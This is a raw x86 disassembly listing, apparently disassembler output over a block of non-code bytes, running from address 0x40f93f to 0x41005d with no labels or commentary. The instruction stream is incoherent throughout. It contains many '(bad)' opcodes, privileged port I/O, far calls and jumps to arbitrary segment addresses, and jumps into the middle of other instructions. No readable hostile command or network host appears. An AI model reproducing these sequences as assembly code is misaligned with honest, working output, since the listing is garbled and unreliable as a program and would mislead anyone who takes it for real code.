  40f93f:	out    0xf9,al
  40f941:	outs   dx,DWORD PTR ds:[esi]
  40f942:	imul   ebx,DWORD PTR [esi],0xfffffff4
  40f945:	shl    esi,cl
  40f947:	xlat   BYTE PTR ds:[ebx]
  40f948:	in     al,dx
  40f949:	cmp    DWORD PTR [edi],edx
  40f94b:	mov    ah,0xd8
  40f94d:	enter  0x8ae0,0x83
  40f951:	ins    BYTE PTR es:[edi],dx
  40f952:	fwait
  40f953:	jns    0x40f990
  40f955:	in     eax,dx
  40f956:	iret   
  40f957:	test   al,0x74
  40f959:	sbb    BYTE PTR [edx+0x8777f82],0x7a
  40f960:	push   es
  40f961:	xlat   BYTE PTR ds:[ebx]
  40f962:	dec    esi
  40f963:	xor    bl,dh
  40f965:	out    dx,eax
  40f966:	scas   al,BYTE PTR es:[edi]
  40f967:	imul   edx,ebp,0x1b36a194
  40f96d:	retf   0xabee
  40f970:	add    BYTE PTR [edi+ecx*1],cl
  40f973:	shr    BYTE PTR [ebx-0x25],1
  40f976:	inc    ecx
  40f977:	fild   WORD PTR [esi-0x7e]
  40f97a:	push   es
  40f97b:	sbb    eax,DWORD PTR [edx]
  40f97d:	jmp    DWORD PTR [eax]
  40f97f:	je     0x40f935
  40f981:	push   edi
  40f982:	xchg   esi,eax
  40f983:	dec    ebx
  40f984:	cmp    eax,0x253a874a
  40f989:	inc    ebx
  40f98a:	popa   
  40f98b:	dec    esp
  40f98c:	aam    0x80
  40f98e:	(bad)  
  40f98f:	sti    
  40f990:	outs   dx,BYTE PTR ds:[esi]
  40f991:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40f993:	sbb    dl,ah
  40f995:	inc    eax
  40f996:	lods   eax,DWORD PTR ds:[esi]
  40f997:	or     bh,BYTE PTR [ebx+0x6]
  40f99a:	xor    al,0x76
  40f99c:	out    0x43,eax
  40f99e:	jno    0x40f935
  40f9a0:	call   0x89a5:0x90a20c17
  40f9a7:	js     0x40f932
  40f9a9:	sbb    BYTE PTR [eax+0x30],ah
  40f9ac:	push   si
  40f9ae:	gs mov dh,0x62
  40f9b1:	enter  0x267e,0x41
  40f9b5:	dec    ebx
  40f9b6:	enter  0xc0ef,0x9e
  40f9ba:	not    BYTE PTR [eax]
  40f9bc:	outs   dx,DWORD PTR ds:[esi]
  40f9bd:	clc    
  40f9be:	daa    
  40f9bf:	pop    ds
  40f9c0:	mov    ebp,0xafb2a0b3
  40f9c5:	pop    esp
  40f9c6:	stos   DWORD PTR es:[edi],eax
  40f9c7:	mov    ds,WORD PTR [ebx+edi*2]
  40f9ca:	and    BYTE PTR [ecx-0x15d37066],ah
  40f9d0:	add    DWORD PTR [eax],0xc241530e
  40f9d6:	xchg   edx,eax
  40f9d7:	retf   
  40f9d8:	jg     0x40fa53
  40f9da:	outs   dx,DWORD PTR ds:[esi]
  40f9db:	ins    DWORD PTR es:[edi],dx
  40f9dc:	pop    ecx
  40f9dd:	lods   al,BYTE PTR ds:[esi]
  40f9de:	call   0x359a:0xc8fdf4e1
  40f9e5:	adc    BYTE PTR [ebx-0xf],0x21
  40f9e9:	pop    es
  40f9ea:	psubd  mm5,QWORD PTR [esi+ecx*8+0x7d]
  40f9ef:	leave  
  40f9f0:	jge    0xc4a4618b
  40f9f6:	push   cs
  40f9f7:	pop    eax
  40f9f8:	retf   
  40f9f9:	xlat   BYTE PTR ds:[ebx]
  40f9fa:	adc    esp,ebx
  40f9fc:	pop    edx
  40f9fd:	inc    sp
  40f9ff:	fucomip st,st(7)
  40fa01:	xor    DWORD PTR [ebx-0x45],0x3c
  40fa05:	xchg   ecx,eax
  40fa06:	cli    
  40fa07:	mov    ds:0xfe10536d,al
  40fa0c:	stc    
  40fa0d:	enter  0xccd,0xf0
  40fa11:	or     eax,0x4f4dc859
  40fa16:	mov    ah,BYTE PTR [eax-0x7db3772c]
  40fa1c:	arpl   bx,sp
  40fa1e:	inc    edi
  40fa1f:	and    bl,bl
  40fa21:	or     al,0xc9
  40fa23:	add    eax,0xada78658
  40fa28:	das    
  40fa29:	cmp    al,0x7
  40fa2b:	in     eax,0xae
  40fa2d:	in     eax,dx
  40fa2e:	iret   
  40fa2f:	and    DWORD PTR [eax],edi
  40fa31:	outs   dx,BYTE PTR ds:[esi]
  40fa32:	pushf  
  40fa33:	xchg   ebx,eax
  40fa34:	sub    DWORD PTR [esp+edi*8],esp
  40fa37:	mov    dl,0xa6
  40fa39:	add    eax,0xd7e49525
  40fa3e:	in     eax,dx
  40fa3f:	ins    DWORD PTR es:[edi],dx
  40fa40:	sub    BYTE PTR [edx+0x4831901f],0xce
  40fa47:	jle    0x40f9e0
  40fa49:	fsubrp st(7),st
  40fa4b:	(bad)  
  40fa4c:	jmp    0x40fa3c
  40fa4e:	test   BYTE PTR [edx],bh
  40fa50:	int    0xdd
  40fa52:	(bad)  
  40fa53:	leave  
  40fa54:	sbb    BYTE PTR [ecx-0x38cd92fe],0x20
  40fa5b:	sbb    dl,bh
  40fa5d:	outs   dx,BYTE PTR ds:[esi]
  40fa5e:	cli    
  40fa5f:	(bad)  [eax]
  40fa61:	enter  0x611b,0x11
  40fa65:	push   esp
  40fa66:	scas   al,BYTE PTR es:[edi]
  40fa67:	inc    ecx
  40fa68:	test   DWORD PTR [eax+0x6f],eax
  40fa6b:	aam    0x45
  40fa6d:	sbb    bl,BYTE PTR [esp+eax*8+0x6c9742bb]
  40fa74:	xor    al,0x4d
  40fa76:	cmp    dl,BYTE PTR [ebp+0x39]
  40fa79:	cld    
  40fa7a:	pop    ss
  40fa7b:	sub    BYTE PTR [eax-0x5],dh
  40fa7e:	and    DWORD PTR [esi+0x12007dda],ebp
  40fa84:	xor    al,BYTE PTR [ecx]
  40fa86:	es pop ecx
  40fa88:	ja     0x40faa7
  40fa8a:	outs   dx,BYTE PTR ds:[esi]
  40fa8b:	aad    0xea
  40fa8d:	out    dx,al
  40fa8e:	scas   eax,DWORD PTR es:[edi]
  40fa8f:	outs   dx,DWORD PTR ds:[esi]
  40fa90:	outs   dx,DWORD PTR ds:[esi]
  40fa91:	mul    DWORD PTR [edi+0x5ccf1b52]
  40fa97:	push   ebp
  40fa98:	push   0x6b
  40fa9a:	stos   DWORD PTR es:[edi],eax
  40fa9b:	lea    esp,[ebx]
  40fa9d:	add    edx,DWORD PTR [edi-0x5af75a75]
  40faa3:	stos   DWORD PTR es:[edi],eax
  40faa4:	(bad)
  40faa9:	imul   esp,ebx,0x64
  40faac:	(bad)  
  40faae:	imul   ebp,DWORD PTR ds:0xc026a8ef,0x7e
  40fab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fab6:	or     DWORD PTR [ebp-0x17bd419c],eax
  40fabc:	cdq    
  40fabd:	inc    ecx
  40fabe:	inc    eax
  40fabf:	inc    ecx
  40fac0:	(bad)  
  40fac1:	repz pop es
  40fac3:	jnp    0x40fa7a
  40fac5:	das    
  40fac6:	lea    eax,[edi+0xd]
  40fac9:	mov    ds:0x79ca4419,al
  40face:	in     eax,0xba
  40fad0:	add    eax,0xae75a996
  40fad5:	fst    DWORD PTR [edx-0x1f]
  40fad8:	loope  0x40fa90
  40fada:	jne    0x40faf1
  40fadc:	push   eax
  40fadd:	mov    al,ds:0x68a60039
  40fae2:	jne    0x40faad
  40fae4:	cmp    BYTE PTR [ecx+0x57],0xc5
  40fae8:	hlt    
  40fae9:	stos   BYTE PTR es:[edi],al
  40faea:	xor    al,BYTE PTR [eax]
  40faec:	icebp  
  40faed:	dec    esi
  40faee:	stos   BYTE PTR es:[edi],al
  40faef:	das    
  40faf0:	(bad)  
  40faf1:	leave  
  40faf2:	addr16 adc bh,dl
  40faf5:	in     al,dx
  40faf6:	mov    dl,0xaa
  40faf8:	sete   BYTE PTR [edx+0x24]
  40fafc:	jle    0x40fafe
  40fafe:	fist   WORD PTR [esi]
  40fb00:	jecxz  0x40fb4d
  40fb02:	xor    eax,0xe20fd422
  40fb07:	mov    dh,0xf9
  40fb09:	adc    al,0x9
  40fb0b:	hlt    
  40fb0c:	xchg   ecx,eax
  40fb0d:	int3   
  40fb0e:	jbe    0x40fb04
  40fb10:	ss push edx
  40fb12:	daa    
  40fb13:	and    cl,BYTE PTR [edx+esi*4+0x5e]
  40fb17:	cwde   
  40fb18:	adc    BYTE PTR [ecx+0x7e],bh
  40fb1b:	fs inc ebx
  40fb1d:	in     al,dx
  40fb1e:	fsubr  QWORD PTR [edx+0x139e7647]
  40fb24:	jbe    0x40faac
  40fb26:	cmp    eax,DWORD PTR [ecx]
  40fb28:	test   DWORD PTR [ebx+0x3faed4c5],0x34c42230
  40fb32:	push   0x48
  40fb34:	inc    ebx
  40fb35:	push   esi
  40fb36:	sub    DWORD PTR [edx-0x54586070],edi
  40fb3c:	js     0x40fb5b
  40fb3e:	std    
  40fb3f:	je     0x40fb88
  40fb41:	jnp    0x40fb9f
  40fb43:	ret    0x98a5
  40fb46:	(bad)
  40fb4a:	pop    ecx
  40fb4b:	mov    bh,0x1b
  40fb4d:	arpl   dx,ax
  40fb4f:	push   esi
  40fb50:	stos   DWORD PTR es:[edi],eax
  40fb51:	dec    edx
  40fb52:	call   0xe162:0xac945f8f
  40fb59:	sbb    ah,BYTE PTR [esi]
  40fb5b:	(bad)  
  40fb5c:	xchg   ebx,eax
  40fb5d:	out    0x49,al
  40fb5f:	mov    edi,0xab762435
  40fb64:	in     eax,dx
  40fb65:	mov    edi,0x765c9e00
  40fb6a:	cli    
  40fb6b:	test   DWORD PTR [edx],edx
  40fb6d:	xor    DWORD PTR [esi+0x2],0xffffffaf
  40fb71:	sahf   
  40fb72:	cmp    eax,DWORD PTR [ebx-0xb]
  40fb75:	adc    DWORD PTR [ebp+0x51056ab9],ecx
  40fb7b:	jle    0x40fb3b
  40fb7d:	push   0x24
  40fb7f:	sub    eax,0x91611987
  40fb84:	dec    ebx
  40fb85:	sbb    DWORD PTR [edx+0x24],esp
  40fb88:	call   0xb3aa:0xc84efb33
  40fb8f:	scas   eax,DWORD PTR es:[edi]
  40fb90:	cmc    
  40fb91:	add    dh,BYTE PTR [edi]
  40fb93:	sti    
  40fb94:	push   ecx
  40fb95:	xchg   edx,eax
  40fb96:	ds std 
  40fb98:	adc    BYTE PTR [ebx+ecx*2+0x75],al
  40fb9c:	or     esp,esi
  40fb9e:	pushf  
  40fb9f:	pop    ss
  40fba0:	pop    edx
  40fba1:	push   0x45
  40fba3:	fwait
  40fba4:	scas   eax,DWORD PTR es:[edi]
  40fba5:	popf   
  40fba6:	dec    ecx
  40fba7:	sub    al,0x5f
  40fba9:	cdq    
  40fbaa:	sbb    BYTE PTR [eax],bl
  40fbac:	test   DWORD PTR [eax+0xa9a5dcf],esi
  40fbb2:	mov    gs,WORD PTR [eax+0x78]
  40fbb5:	outs   dx,BYTE PTR ds:[esi]
  40fbb6:	mov    cl,0x60
  40fbb8:	push   ecx
  40fbb9:	dec    ebx
  40fbba:	jmp    0xfa84:0xb80b52fa
  40fbc1:	nop
  40fbc2:	test   eax,0x204bd38d
  40fbc7:	pop    edx
  40fbc8:	aam    0x8a
  40fbca:	mov    al,ds:0x93fe4357
  40fbcf:	ret    
  40fbd0:	lods   eax,DWORD PTR ds:[esi]
  40fbd1:	mov    esi,0x53d4dfb4
  40fbd6:	fs aad 0x40
  40fbd9:	cdq    
  40fbda:	retf   0xcfe
  40fbdd:	sbb    DWORD PTR [edi],ebp
  40fbdf:	sub    edx,DWORD PTR [edi]
  40fbe1:	cwde   
  40fbe2:	push   ss
  40fbe3:	cdq    
  40fbe4:	adc    al,0x53
  40fbe6:	les    ecx,FWORD PTR [edi+0x5dcfa8ed]
  40fbec:	loop   0x40fbba
  40fbee:	sub    edx,eax
  40fbf0:	pop    esp
  40fbf1:	js     0x40fbb4
  40fbf3:	sub    DWORD PTR [ebp-0xe],ecx
  40fbf6:	les    edx,FWORD PTR [eax-0x5f2696ca]
  40fbfc:	lods   al,BYTE PTR ds:[esi]
  40fbfd:	pop    esi
  40fbfe:	int    0x87
  40fc00:	(bad)  
  40fc01:	jecxz  0x40fc35
  40fc03:	or     ebp,edi
  40fc05:	mov    bl,BYTE PTR [edx+ebp*1-0x2064bab7]
  40fc0c:	test   BYTE PTR [ebx-0x73d455cd],bh
  40fc12:	stos   DWORD PTR es:[edi],eax
  40fc13:	mov    BYTE PTR [eax],al
  40fc15:	repnz nop
  40fc17:	cli    
  40fc18:	dec    ebx
  40fc19:	popa   
  40fc1a:	out    0xa9,eax
  40fc1c:	pop    es
  40fc1d:	sti    
  40fc1e:	lock jge 0x40fc5a
  40fc21:	jne    0x40fbd2
  40fc23:	mov    ch,0xaf
  40fc25:	in     eax,dx
  40fc26:	push   es
  40fc27:	mov    esp,0x5867ad43
  40fc2c:	mov    ebp,0xf0748f90
  40fc31:	xchg   esp,eax
  40fc32:	cmp    al,0xc1
  40fc34:	pop    ebx
  40fc35:	sbb    eax,0x73a7b7d7
  40fc3a:	call   0xe42d:0xd1177734
  40fc41:	hlt    
  40fc42:	or     esp,esp
  40fc44:	inc    ecx
  40fc45:	out    0x35,eax
  40fc47:	push   ss
  40fc48:	repz mov eax,0x5da9d49e
  40fc4e:	daa    
  40fc4f:	adc    bh,ah
  40fc51:	test   DWORD PTR [edx],eax
  40fc53:	stos   BYTE PTR es:[edi],al
  40fc54:	in     eax,0x50
  40fc56:	mov    bh,0x93
  40fc58:	loop   0x40fc7f
  40fc5a:	jne    0x40fc63
  40fc5c:	mov    ds:0x1adb3fc4,eax
  40fc61:	xchg   DWORD PTR [ecx+0x61],edi
  40fc64:	lahf   
  40fc65:	mov    WORD PTR [edi],?
  40fc67:	mov    bh,0x78
  40fc69:	sbb    BYTE PTR [ebp+0x2503a096],al
  40fc6f:	shl    BYTE PTR [ebx+0x46f8f028],cl
  40fc75:	or     BYTE PTR [eax-0x46],dl
  40fc78:	cmp    DWORD PTR [ecx+0x2ddc627a],edi
  40fc7e:	daa    
  40fc7f:	mov    BYTE PTR [ebx+eax*1-0x65269cd],ch
  40fc86:	cmp    esi,DWORD PTR ds:0x95a80940
  40fc8c:	cmp    esp,DWORD PTR [ebp+0x10dfdaac]
  40fc92:	loope  0x40fc2d
  40fc94:	jno    0x40fcc4
  40fc96:	add    al,0x5e
  40fc98:	(bad)  
  40fc9a:	xchg   ecx,eax
  40fc9b:	mov    edi,0x368d63f6
  40fca0:	daa    
  40fca1:	sub    al,0xa3
  40fca3:	cli    
  40fca4:	aas    
  40fca5:	push   cs
  40fca6:	adc    ch,al
  40fca8:	inc    esp
  40fca9:	fwait
  40fcaa:	int3   
  40fcab:	sub    ch,al
  40fcad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcae:	cwde   
  40fcaf:	or     ebp,0xfffffff1
  40fcb2:	mov    edi,0x24411490
  40fcb7:	ss iret 
  40fcb9:	fcom   DWORD PTR [ebx-0x4f]
  40fcbc:	inc    esp
  40fcbd:	xchg   edx,eax
  40fcbe:	shl    dh,0x4
  40fcc1:	push   es
  40fcc2:	xor    BYTE PTR [eax+0x4e],al
  40fcc5:	(bad)  
  40fcc6:	leave  
  40fcc7:	and    esi,DWORD PTR [edx+edi*1]
  40fcca:	or     BYTE PTR [esp+esi*4+0x1b],al
  40fcce:	fmul   QWORD PTR [eax-0x4c]
  40fcd1:	js     0x40fd21
  40fcd3:	mov    ah,0x33
  40fcd5:	mov    al,ds:0x9028c416
  40fcda:	or     dh,bh
  40fcdc:	push   esp
  40fcdd:	mov    ss,WORD PTR [eax+0x4e]
  40fce0:	arpl   WORD PTR [ebp+0x26babd5c],si
  40fce6:	push   cs
  40fce7:	out    dx,eax
  40fce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fce9:	daa    
  40fcea:	sbb    edx,DWORD PTR [ecx+0x4eecdaf1]
  40fcf0:	mov    cl,0xa5
  40fcf2:	loop   0x40fcac
  40fcf4:	xchg   ebx,eax
  40fcf5:	add    al,dh
  40fcf7:	jb     0x40fca7
  40fcf9:	dec    ebx
  40fcfa:	and    cl,bh
  40fcfc:	fldenv [esi]
  40fcfe:	sub    esp,DWORD PTR [edi]
  40fd00:	mov    ah,0x9c
  40fd02:	push   ds
  40fd03:	cli    
  40fd04:	jne    0x40fd31
  40fd06:	fisttp QWORD PTR [esp+eax*2+0x2536fefb]
  40fd0d:	into   
  40fd0e:	xchg   BYTE PTR [ecx+0xe82e6de],ah
  40fd14:	retf   
  40fd15:	pop    ds
  40fd16:	lea    ecx,[esi+0x242c5951]
  40fd1c:	int    0x1
  40fd1e:	retf   0xe008
  40fd21:	cmc    
  40fd22:	jns    0x40fd09
  40fd24:	shl    DWORD PTR [edx],1
  40fd26:	jmp    0x8028815
  40fd2b:	jae    0x40fcba
  40fd2d:	mov    ecx,0x5ffa5328
  40fd32:	pop    esi
  40fd33:	call   0x926c:0xbc443def
  40fd3a:	jnp    0x40fd92
  40fd3c:	je     0x40fd78
  40fd3e:	sub    DWORD PTR [esi-0x27290b4],ecx
  40fd44:	cmp    BYTE PTR [edi-0x57bb6781],0x4c
  40fd4b:	add    BYTE PTR [ecx],0x46
  40fd4e:	pop    esi
  40fd4f:	adc    edx,esp
  40fd51:	lods   eax,DWORD PTR ds:[esi]
  40fd52:	dec    ebp
  40fd53:	mov    esi,0xfbf7aa02
  40fd58:	xchg   bh,al
  40fd5a:	js     0x40fd11
  40fd5c:	rol    BYTE PTR [edi-0x6a4f8f53],0xc3
  40fd63:	pushf  
  40fd64:	lock and bh,BYTE PTR [ecx]
  40fd67:	inc    esp
  40fd68:	sub    al,0xd4
  40fd6a:	jl     0x40fd89
  40fd6c:	adc    DWORD PTR [eax],edx
  40fd6e:	push   eax
  40fd6f:	mov    eax,ds:0x9012b901
  40fd74:	addr16 jo 0x40fd1d
  40fd77:	rol    BYTE PTR [eax+0x10],1
  40fd7a:	inc    esp
  40fd7b:	inc    edx
  40fd7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd7d:	inc    ebx
  40fd7e:	push   ecx
  40fd7f:	dec    ebp
  40fd80:	pop    ecx
  40fd81:	mov    cl,0x4a
  40fd83:	daa    
  40fd84:	xor    al,0xa3
  40fd86:	sub    al,ah
  40fd88:	je     0x40fd17
  40fd8a:	lds    eax,FWORD PTR ds:0x4480eb49
  40fd90:	dec    esp
  40fd91:	sub    BYTE PTR [ebx-0x66],0xdc
  40fd95:	popf   
  40fd96:	pop    ebx
  40fd97:	xchg   edi,eax
  40fd98:	cmp    ch,BYTE PTR [ebx+ebp*1+0x4e0bf1b4]
  40fd9f:	push   cs
  40fda0:	pop    es
  40fda1:	sbb    esp,DWORD PTR ds:0xdc94620c
  40fda7:	pop    esi
  40fda8:	scas   al,BYTE PTR es:[edi]
  40fda9:	loop   0x40fd46
  40fdab:	jmp    0xd07c2bb4
  40fdb0:	fwait
  40fdb1:	(bad)  
  40fdb2:	mov    ebp,0x40da9239
  40fdb7:	pop    ebx
  40fdb8:	loope  0x40fd9e
  40fdba:	(bad)  
  40fdbb:	mov    esi,0x8eaca73b
  40fdc0:	and    DWORD PTR ds:0xb7a7cfb4,ebp
  40fdc6:	jae    0x40fd50
  40fdc8:	icebp  
  40fdc9:	outs   dx,BYTE PTR ds:[esi]
  40fdca:	add    DWORD PTR [esi-0xd6f87f6],edi
  40fdd0:	jo     0x40fd7e
  40fdd2:	pop    esp
  40fdd3:	retf   0x526c
  40fdd6:	sub    BYTE PTR [ebx+0x16a9cb83],cl
  40fddc:	out    dx,al
  40fddd:	add    edx,0xc5aa1817
  40fde3:	sbb    al,0xf0
  40fde5:	mov    cl,0x38
  40fde7:	or     eax,0xdd0ae262
  40fdec:	(bad)  
  40fded:	and    eax,0x19671977
  40fdf2:	js     0x40fd9e
  40fdf4:	sbb    BYTE PTR [ecx+eiz*4-0x80],cl
  40fdf8:	cmpxchg BYTE PTR [ecx+0x24],cl
  40fdfc:	fmul   QWORD PTR [ebp-0x7dd90df]
  40fe02:	sbb    edi,eax
  40fe04:	mov    BYTE PTR gs:[edx],dl
  40fe07:	add    BYTE PTR [esi+eax*2+0x4cae0f77],bl
  40fe0e:	mov    bl,0x8c
  40fe10:	fnstenv [ebx]
  40fe12:	lahf   
  40fe13:	test   cl,al
  40fe15:	std    
  40fe16:	jle    0x40fe01
  40fe18:	adc    ebx,DWORD PTR [ebx+ebp*8+0x4f91e9c1]
  40fe1f:	stos   BYTE PTR es:[edi],al
  40fe20:	dec    eax
  40fe21:	pop    esi
  40fe22:	xchg   esp,eax
  40fe23:	and    bl,cl
  40fe25:	psraw  mm2,mm5
  40fe28:	sub    eax,0x84d9f190
  40fe2d:	arpl   WORD PTR [esi-0x6c],si
  40fe30:	pusha  
  40fe31:	ret    
  40fe32:	(bad)  
  40fe33:	(bad)  
  40fe34:	stc    
  40fe35:	mov    ds:0x315952af,al
  40fe3a:	push   esi
  40fe3b:	jp     0x40fe67
  40fe3d:	in     al,dx
  40fe3e:	rcr    cl,0xea
  40fe41:	jmp    0xbe8a:0xe4f53f06
  40fe48:	out    dx,eax
  40fe49:	aas    
  40fe4a:	push   es
  40fe4b:	mov    cl,0x64
  40fe4d:	nop
  40fe4e:	retf   0xa827
  40fe51:	mov    DWORD PTR [edx-0x4a05e30c],edx
  40fe57:	dec    edi
  40fe58:	mov    ecx,0x38a132ec
  40fe5d:	fnstcw WORD PTR [esi+0x182f837d]
  40fe63:	out    0x86,eax
  40fe65:	add    BYTE PTR [eax+0x1a],al
  40fe68:	aad    0x2b
  40fe6a:	pop    esp
  40fe6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe6c:	in     al,dx
  40fe6d:	and    DWORD PTR [ebp+0x6a],edx
  40fe70:	in     eax,0xb
  40fe72:	inc    esi
  40fe73:	or     eax,0x36bf7806
  40fe78:	adc    eax,0x67dae23a
  40fe7d:	popa   
  40fe7e:	jo     0x40fe21
  40fe80:	pusha  
  40fe81:	inc    edx
  40fe82:	or     al,0x96
  40fe84:	gs leave 
  40fe86:	pop    ds
  40fe87:	in     eax,dx
  40fe88:	shr    ebx,1
  40fe8a:	dec    ebp
  40fe8b:	or     cl,al
  40fe8d:	sub    DWORD PTR ds:0xcc86579b,esp
  40fe93:	adc    BYTE PTR [eax-0x2d],cl
  40fe96:	xchg   DWORD PTR [eax+0x15],ebp
  40fe99:	lds    esi,FWORD PTR [esi]
  40fe9b:	push   eax
  40fe9c:	pop    ss
  40fe9d:	dec    ebp
  40fe9e:	jae    0x40fe9d
  40fea0:	and    DWORD PTR [ebx],0x42
  40fea3:	retf   
  40fea4:	out    0x2f,al
  40fea6:	jp     0x40fef7
  40fea8:	sub    esi,edx
  40feaa:	test   DWORD PTR [edi],ecx
  40feac:	fwait
  40fead:	jmp    0x3a5b874b
  40feb2:	retf   0x5343
  40feb5:	dec    edx
  40feb6:	neg    ebp
  40feb8:	push   es
  40feb9:	and    BYTE PTR [edi],al
  40febb:	cmp    eax,0xd6340ecc
  40fec0:	mov    esi,0xc63871f
  40fec5:	ins    DWORD PTR es:[edi],dx
  40fec6:	cmp    eax,esp
  40fec8:	jno    0x40fe9e
  40feca:	or     al,0xf3
  40fecd:	in     al,0x94
  40fecf:	or     al,0x2f
  40fed1:	cmp    bl,dl
  40fed3:	xchg   esi,eax
  40fed4:	jg     0x40fe7e
  40fed6:	ins    DWORD PTR es:[edi],dx
  40fed7:	loope  0x40ff0e
  40fed9:	adc    BYTE PTR ds:[ebp-0x7d2d5717],dh
  40fee0:	jp     0x40fefe
  40fee2:	or     DWORD PTR [ebp+0x2de03616],edx
  40fee8:	add    bl,BYTE PTR [esi+0x74551e18]
  40feee:	mov    ah,BYTE PTR [esi-0x741ff26b]
  40fef4:	std    
  40fef5:	pusha  
  40fef6:	sub    BYTE PTR [esi-0x6106b1f],ah
  40fefc:	cli    
  40fefd:	adc    al,0x3d
  40feff:	outs   dx,DWORD PTR ds:[esi]
  40ff00:	xchg   dl,bh
  40ff02:	or     eax,DWORD PTR [ecx]
  40ff04:	sub    eax,0xa9d55df5
  40ff09:	mov    DWORD PTR [ecx+0x5e],esp
  40ff0c:	lahf   
  40ff0d:	adc    al,0x30
  40ff0f:	data16 adc BYTE PTR [ecx-0x5c17058f],bh
  40ff16:	dec    esi
  40ff17:	jecxz  0x40ff54
  40ff19:	dec    esp
  40ff1a:	sti    
  40ff1b:	(bad)  
  40ff1c:	push   edi
  40ff1d:	daa    
  40ff1e:	cmp    BYTE PTR [ebp-0x64],bh
  40ff21:	jle    0x40ff20
  40ff23:	xor    al,ch
  40ff25:	mov    bl,0x98
  40ff27:	leave  
  40ff28:	ret    0xf3bc
  40ff2b:	in     al,0x4a
  40ff2d:	mov    es,WORD PTR [ecx-0x6acf66b8]
  40ff33:	add    ch,bl
  40ff35:	mov    edi,0x69996a7b
  40ff3a:	pop    ds
  40ff3b:	or     eax,0x8382f558
  40ff40:	push   cs
  40ff41:	(bad)  
  40ff42:	rcl    ch,1
  40ff44:	and    eax,DWORD PTR [esi-0x7]
  40ff47:	int    0x51
  40ff49:	mov    al,ds:0x7341f7c0
  40ff4e:	mov    WORD PTR [eax-0x4b11376f],ds
  40ff54:	outs   dx,DWORD PTR ds:[esi]
  40ff55:	add    BYTE PTR [esi-0x1af002],cl
  40ff5b:	aas    
  40ff5c:	adc    al,0xb6
  40ff5e:	dec    esi
  40ff5f:	add    al,0xbc
  40ff61:	push   ebp
  40ff62:	dec    eax
  40ff63:	pop    eax
  40ff64:	dec    ecx
  40ff65:	out    dx,al
  40ff66:	icebp  
  40ff67:	pop    es
  40ff68:	xchg   edx,eax
  40ff69:	(bad)  
  40ff6a:	jmp    0x40ffa8
  40ff6c:	retf   
  40ff6d:	shl    BYTE PTR [ebx+0x21],cl
  40ff70:	aad    0x3f
  40ff72:	or     edi,0x132791f5
  40ff78:	sti    
  40ff79:	adc    DWORD PTR [ecx],ebp
  40ff7b:	les    esp,FWORD PTR [edi]
  40ff7d:	push   0xd0f42a58
  40ff82:	nop
  40ff83:	push   ds
  40ff84:	jne    0x40ff24
  40ff86:	mov    cl,0x6e
  40ff88:	mov    al,ds:0x992dec3c
  40ff8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff8e:	or     al,0x58
  40ff90:	or     ch,BYTE PTR [ecx-0x31]
  40ff93:	js     0x410003
  40ff95:	adc    edi,DWORD PTR [eax]
  40ff97:	cld    
  40ff98:	or     al,0x5c
  40ff9a:	std    
  40ff9b:	cs ins DWORD PTR es:[edi],dx
  40ff9d:	cmp    cl,bh
  40ff9f:	int3   
  40ffa0:	mov    ?,WORD PTR [ebp-0x4]
  40ffa3:	inc    ebp
  40ffa4:	cmp    BYTE PTR [esi+0x52],dl
  40ffa7:	adc    BYTE PTR [ebx],0xb8
  40ffaa:	fst    QWORD PTR cs:[esi+0x78e56349]
  40ffb1:	xor    al,0x56
  40ffb3:	gs fwait
  40ffb5:	mov    ecx,ds
  40ffb7:	mov    eax,0x2d1a9fb8
  40ffbc:	push   ebp
  40ffbd:	(bad)  
  40ffbe:	cmc    
  40ffbf:	stc    
  40ffc0:	mov    bh,0xea
  40ffc2:	mov    eax,0x75ac6b69
  40ffc7:	gs in  eax,dx
  40ffc9:	daa    
  40ffca:	dec    edx
  40ffcb:	xchg   esi,eax
  40ffcc:	out    dx,al
  40ffcd:	int    0xe7
  40ffcf:	or     BYTE PTR [ebx],dh
  40ffd1:	dec    esi
  40ffd2:	loopne 0x40ffe4
  40ffd4:	(bad)  
  40ffd5:	lahf   
  40ffd6:	sub    eax,0x8a8ddbe8
  40ffdb:	mov    WORD PTR ds:0x133583f7,fs
  40ffe1:	push   0x19
  40ffe3:	add    al,0x85
  40ffe5:	pushf  
  40ffe6:	sar    DWORD PTR [eax],0xd1
  40ffe9:	je     0x41001f
  40ffeb:	test   DWORD PTR [ebx],ebp
  40ffed:	mov    ds:0xbd02a1ab,eax
  40fff2:	cwde   
  40fff3:	(bad)  
  40fff4:	cmp    eax,0x31e3ca8a
  40fff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fffa:	or     al,0xac
  40fffc:	or     edi,DWORD PTR [edx+ebx*8-0x1d485528]
  410003:	(bad)  
  410004:	outs   dx,BYTE PTR ds:[esi]
  410005:	xchg   BYTE PTR [edx],al
  410007:	(bad)  
  410008:	pop    eax
  410009:	clc    
  41000a:	sub    eax,DWORD PTR [ecx-0x2ffdaedb]
  410010:	sub    DWORD PTR [ecx],ecx
  410012:	fidiv  WORD PTR [edx-0x33]
  410015:	inc    edi
  410016:	cmp    dl,ah
  410018:	xchg   BYTE PTR [ebx-0x1dd7e73c],bl
  41001e:	sti    
  41001f:	sub    BYTE PTR [edi],dl
  410021:	iret   
  410022:	std    
  410023:	(bad)  [ebp+0x3d170243]
  410029:	out    dx,eax
  41002a:	mov    DWORD PTR [eax-0x56],esp
  41002d:	jo     0x410076
  41002f:	mov    bh,BYTE PTR [edi]
  410031:	out    dx,eax
  410032:	or     al,0x43
  410034:	(bad)  
  410035:	outs   dx,DWORD PTR ds:[esi]
  410036:	push   eax
  410037:	push   edi
  410038:	sbb    eax,0xabc198ba
  41003d:	push   esi
  41003e:	xchg   bh,ch
  410040:	pop    ebp
  410041:	mov    ah,0xb2
  410043:	out    0xa3,eax
  410045:	cmp    al,0xa8
  410047:	mov    ss,WORD PTR [ecx]
  410049:	jns    0x410053
  41004b:	lds    edi,FWORD PTR [edx-0x3a7e548c]
  410051:	inc    ebx
  410052:	ds mov bl,0x25
  410055:	push   es
  410056:	sub    BYTE PTR [ebx],cl
  410058:	stc    
  410059:	adc    al,0xe0
  41005b:	or     BYTE PTR [ecx],ch
  41005d:	outs   dx,BYTE PTR ds:[esi]
